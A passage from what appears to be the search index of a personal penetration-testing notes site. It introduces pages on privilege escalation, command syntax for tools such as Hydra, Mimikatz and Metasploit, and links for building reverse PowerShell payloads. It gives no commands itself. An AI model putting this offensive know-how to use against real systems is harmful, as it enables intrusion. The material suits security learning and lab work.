Hopefully this can make some sense of all the tools that are available out there and spare some work along the way. This is a heavily in-progress work and I will be updating it along the way when new things cross my path.</p> <p>So far this thread can be split up into three major components:</p> <ol> <li>Processes</li> <li>Like how to elevate your privileges on a Windows machine</li> <li>Command syntax</li> <li>General commands for use with the likes of Hydra or Mimikatz</li> <li>Specific command sheets:</li> <li>Metasploit</li> <li>Powershell</li> <li>Tools and other resources</li> <li>Like Sublist3r, GTFObins, or Exploit Notes</li> </ol> <p>They all have their purpose. </p> <p>The Processes list is most usefull when you need to figure out how to accomplish something. A simple example is how to copy a file from a linux machine via ssh. Or if you need to find information about the system you have breached. Or how to elevate your privileges on said machine. This page will list various techniques and steps you can take to accomplish these goals. It will list programs or websites as well as some commands to use. But if you need more control over the tool, you should look at the Command syntax page.</p> <p>The Commmand syntax page contain a list of tools and their respective commands that you will most commonly use. This is not like the tools manual page. Merely a collection of (example) commands you can directly use for certain use cases. Lets say you need to crack a <code>.rar</code> file with John the Ripper. This list will show you the exact command to use for it. You only need to fill in you own data. So a basic understanding of the tool itself is still usefull. I guess it is kind of similar to <code>arsenal</code>. However, this includes commands I have used before and weren't listed in arsenal.</p> <p>The Tools and other resources page can be usefull if you know what you need to do, but are unsure of the tool to use. Or maybe you need to create a reverse powershell payload. This can be found on the linked websites on this list. You will also find the homepages to the various tools mentioned in other parts of the repository. </p> <p>text - \u2705 text</p>"},{"location":"processes/","title":"Processes","text":"<p>[!Note] Heavy work in progress</p> <p></p> <p><p>A curated list of steps/processes to use when tackling a certain problem.</p></p> <p>When dealing with a certain challenge, you have to come up with a plan to come up with a solution.
